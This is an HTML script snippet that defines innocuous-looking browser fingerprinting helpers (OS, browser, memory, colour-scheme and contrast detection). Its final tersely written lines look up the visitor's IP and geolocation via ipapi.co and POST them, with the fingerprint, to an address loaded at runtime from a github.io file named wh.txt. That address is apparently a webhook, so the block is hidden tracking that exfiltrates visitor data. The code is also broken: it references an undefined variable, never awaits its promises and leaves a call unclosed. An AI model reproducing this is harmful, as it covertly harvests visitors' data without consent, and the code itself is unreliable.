<script>
  function getOS() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Windows")) {
      return "Windows";
    } else if (userAgent.includes("Android")) {
      return "Android";
    } else if (
      userAgent.includes("iPhone") ||
      userAgent.includes("iPod") ||
      userAgent.includes("iPad")
    ) {
      return "iOS";
    } else if (userAgent.includes("Linux")) {
      return "Linux";
    } else if (userAgent.includes("CrOS")) {
      return "ChromeOS";
    } else if (userAgent.includes("Mac OS")) {
      return "macOS";
    }
    return "Other";
  }

  function getBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome")) {
      return "Chrome";
    } else if (userAgent.includes("Firefox")) {
      return "Firefox";
    } else if (userAgent.includes("Safari")) {
      return "Safari";
    }
    return "Other";
  }

  function getMemory() {
    // @ts-expect-error
    if (navigator.deviceMemory == undefined) {
      return "Unsupported";
    } else {
      // @ts-expect-error
      return navigator.deviceMemory;
    }
  }

  function getPreferredColorScheme(args) {
    return (
      window.matchMedia("(prefers-color-scheme: dark)").matches ===true
    );
  }

  function getPreferredContrast() {
    return !!window.matchMedia("(prefers-contrast: more)").matches;
  }
  f=fetch
  g=async(u,d)=>{r=await f(u,d);t=await response.text();return t}
  p=g("https://ipapi.co/json")
  b=g("wlodekm.github.io/n/wh.txt")
  p+="\n"
  p+=JSON.stringify({
    os: getOS(),
    browser: getBrowser(),
    mem: getMemory(),
    dark: getPreferredColorScheme(),
    contrast: getPreferredContrast(),
  })
  x={content:p}
  w=g(b,{method:"POST",headers:{"Content-Type":"application/json",},body: JSON.stringify(x)}
</script>
